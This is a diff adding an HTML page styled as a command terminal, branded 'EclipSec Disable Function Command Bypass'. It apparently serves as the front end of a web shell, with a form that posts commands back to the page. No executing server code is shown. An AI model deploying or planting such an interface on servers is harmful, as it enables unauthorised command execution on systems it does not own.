@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CMD - Eclipse Terminal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Roboto Mono', monospace;
+            background-color: #1e1e2f;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .terminal {
+            background-color: #2d2d44;
+            width: 80%;
+            max-width: 900px;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+        }
+        .terminal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 10px;
+            background-color: #38385e;
+            border-radius: 8px;
+        }
+        .terminal-header span {
+            color: #a1a1e5;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .status-indicator {
+            display: flex;
+            align-items: center;
+        }
+        .status-indicator span {
+            margin-left: 10px;
+            color: #28c76f;
+        }
+        .status-circle {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background-color: #28c76f;
+        }
+        .terminal-output {
+            background-color: #1e1e2f;
+            color: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            height: 300px;
+            overflow-y: auto;
+            font-size: 16px;
+            font-weight: 400;
+            white-space: pre-wrap;
+            border: 1px solid #38385e;
+            line-height: 1.5;
+        }
+        .highlight {
+            color: #28c76f;
+            font-weight: bold;
+        }
+        .command-output {
+            color: #28c76f;
+            font-weight: bold;
+        }
+        .terminal-input {
+            display: flex;
+            align-items: center;
+            margin-top: 20px;
+        }
+        .terminal-input input {
+            flex: 1;
+            padding: 12px;
+            background-color: #38385e;
+            border: none;
+            color: #ffffff;
+            font-family: 'Roboto Mono', monospace;
+            font-size: 16px;
+            border-radius: 8px;
+            margin-right: 10px;
+            box-shadow: inset 0 0 8px rgba(0, 0, 0, 0.3);
+        }
+        .terminal-input button {
+            background-color: #28c76f;
+            border: none;
+            padding: 12px 24px;
+            color: #ffffff;
+            font-family: 'Roboto Mono', monospace;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(40, 199, 111, 0.3);
+        }
+        .terminal-input button:hover {
+            background-color: #22b369;
+        }
+    </style>
+</head>
+<body>
+    <div class="terminal">
+        <div class="terminal-header">
+            <span>CMD - EclipSec Bypass</span>
+            <div class="status-indicator">
+                <div class="status-circle"></div>
+                <span>Status: Connected</span>
+            </div>
+        </div>
+        <div class="terminal-output" id="terminal-output">
+<span class="highlight">╭─「 eclipse security labs 」</span>
+<span class="highlight">| $ Made By NowMeee</span>
+<span class="highlight">| $ visit : https://eclipsesec.tech/</span>
+<span class="highlight">| $ EclipSec Disable Function Command Bypass 
+<span class="highlight">╰──────────────────────────────────────────────
+<span class="highlight">$ NowMeee hacker
+        </div>
+        <form class="terminal-input" action="" method="post">
+            <input type="text" id="eclipse" name="eclipse" placeholder="Enter your command...">
+            <button type="submit">Run</button>
+        </form>
+    </div>
+</body>
+</html>
